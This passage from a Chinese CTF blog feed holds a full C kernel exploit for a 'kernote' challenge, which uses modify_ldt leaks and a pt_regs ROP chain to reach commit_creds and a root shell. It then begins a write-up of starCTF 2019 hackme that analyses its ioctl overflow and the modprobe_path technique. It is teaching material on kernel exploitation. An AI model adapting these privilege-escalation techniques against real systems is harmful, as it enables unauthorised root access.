class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> add_rsp_pop_pop;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> shell_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6667</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6668</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6669</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> *tmp[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0</span>);</span><br><span class="line">    select(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf = addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">        <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr += <span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                    kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        search_addr += <span class="number">0x1000</span>;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    create(<span class="number">1</span>);</span><br><span class="line">    select(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span> (<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    add_rsp_pop_pop = <span class="number">0xffffffff817c21a6</span> + kernel_offset;</span><br><span class="line">    pop_rdi = <span class="number">0xffffffff81075c4c</span> + kernel_offset;</span><br><span class="line">    init_cred = <span class="number">0xffffffff8266b780</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff810c9dd0</span> + kernel_offset;</span><br><span class="line">    swapgs = <span class="number">0xffffffff81078130</span> + kernel_offset;</span><br><span class="line">    iretq = <span class="number">0xffffffff810002df</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fba</span> + kernel_offset;</span><br><span class="line">    shell_addr = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    edit(add_rsp_pop_pop);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814163459547.png"                      alt="image-20220814163459547"                ></p><p><strong>题目放在：</strong><a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1" >https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？&lt;/p&gt;
&lt;h2 id=&quot;利用原理&quot;&gt;&lt;a href=&quot;#利用原理&quot; c</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="modify_ldt" scheme="https://cv196082.gitee.io/tags/modify-ldt/"/>
    
    <category term="seq_operations" scheme="https://cv196082.gitee.io/tags/seq-operations/"/>
    
    <category term="bypass kpti" scheme="https://cv196082.gitee.io/tags/bypass-kpti/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
  </entry>
  
  <entry>
    <title>starCTF 2019 hackme</title>
    <link href="https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/"/>
    <id>https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/</id>
    <published>2022-08-10T07:55:21.000Z</published>
    <updated>2022-08-10T07:55:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">hackme_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">    __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// rax</span></span><br><span class="line">    __int64 v8; <span class="comment">// rdi</span></span><br><span class="line">    __int64 *v9; <span class="comment">// rax</span></span><br><span class="line">    __int64 size; <span class="comment">// r12</span></span><br><span class="line">    __int64 content; <span class="comment">// r13</span></span><br><span class="line">    __int64 *v12; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v13; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v14; <span class="comment">// rdi</span></span><br><span class="line">    __int64 *v15; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v16; <span class="comment">// rax</span></span><br><span class="line">    arg v17; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">    copy_from_user(&amp;v17, a3, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v13 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">        v14 = pool[v13];</span><br><span class="line">        v15 = &amp;pool[v13];</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">        &#123;</span><br><span class="line">            kfree();</span><br><span class="line">            *v15 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x30002</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">            v8 = pool[v7];</span><br><span class="line">            v9 = &amp;pool[v7];</span><br><span class="line">            <span class="keyword">if</span> ( v8 &amp;&amp; v17.offset + v17.size &lt;= (<span class="keyword">unsigned</span> __int64)v9[<span class="number">1</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">                copy_from_user(v17.offset + v8, v17.content, v17.size);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0x30003</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">            v4 = pool[v3];</span><br><span class="line">            v5 = &amp;pool[v3];</span><br><span class="line">            <span class="keyword">if</span> ( v4 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v17.offset + v17.size &lt;= (<span class="keyword">unsigned</span> __int64)v5[<span class="number">1</span>] )</span><br><span class="line">                &#123;</span><br><span class="line">                    copy_to_user(v17.content, v17.offset + v4, v17.size);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x30000</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    size = v17.size;</span><br><span class="line">    content = v17.content;</span><br><span class="line">    v12 = &amp;pool[<span class="number">2</span> * LODWORD(v17.idx)];</span><br><span class="line">    <span class="keyword">if</span> ( *v12 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v16 = _kmalloc(v17.size, <span class="number">0x6000C0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    *v12 = v16;</span><br><span class="line">    copy_from_user(v16, content, size);</span><br><span class="line">    v12[<span class="number">1</span>] = size;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> arg struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_4)   ; XREF: hackme_ioctl/r</span><br><span class="line"><span class="number">00000000</span> idx dq ?                                ; XREF: hackme_ioctl+<span class="number">46</span>/r</span><br><span class="line"><span class="number">00000000</span>                                         ; hackme_ioctl:loc_8E/r ...</span><br><span class="line"><span class="number">00000008</span> content dq ?                            ; XREF: hackme_ioctl+<span class="number">51</span>/r</span><br><span class="line"><span class="number">00000008</span>                                         ; hackme_ioctl+<span class="number">99</span>/r ...</span><br><span class="line"><span class="number">00000010</span> size dq ?                               ; XREF: hackme_ioctl+<span class="number">4</span>D/r</span><br><span class="line"><span class="number">00000010</span>                                         ; hackme_ioctl+<span class="number">95</span>/r ...</span><br><span class="line"><span class="number">00000018</span> offset dq ?                             ; XREF: hackme_ioctl+<span class="number">49</span>/r</span><br><span class="line"><span class="number">00000018</span>                                         ; hackme_ioctl+<span class="number">91</span>/r</span><br><span class="line"><span class="number">00000020</span> arg ends</span><br></pre></td></tr></table></figure><p>下面是分析出来的结构体，可以看到题目实现了四个较为基本的功能，增加堆块，删除堆块，修改堆块，读取堆块。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里需要注意的对于读写的时候检测offset的方式是 <code>offset+size&lt;(unsigned __int64)size</code> 这里可以看出来存在向上溢出任意地址的读和写。</p><p>kernel使用的堆分配机制是Buddy System和Slab分配器。而Slab分配器是类似于ptmalloc中的fastbin。kmem_cache_cpu中的freelist指向一个slab中第一个空闲的object，接着object存在指针指向后面空闲的object。而这个指针是很类似于fastbin，我们如果修改的话可以实现任意地址分配堆块。</p><h3 id="modprobe-path利用原理"><a href="#modprobe-path利用原理" class="headerlink" title="modprobe_path利用原理"></a>modprobe_path利用原理</h3><p>首先，什么是modprobe呢？根据维基百科的说法：“modprobe是一个Linux程序，最初由Rusty Russell编写，用于在Linux内核中添加一个可加载的内核模块，或者从内核中移除一个可加载的内核模块”。也就是说，它是我们在Linux内核中安装或卸载新模块时都要执行的一个程序。该程序的路径是一个内核全局变量，默认为/sbin/modprobe</p><p>modprobe的路径, 默认是/sbin/modprobe, 存放在内核本身的符号modprobe_path下, 同时，它位于一个可写的内存页中。我们可以通过读取/proc/kallsyms得到它的地址</p><p>其次，当我们执行的文件的类型是系统未知的类型时，将执行modprobe程序（其路径存储在modprobe_path中）。 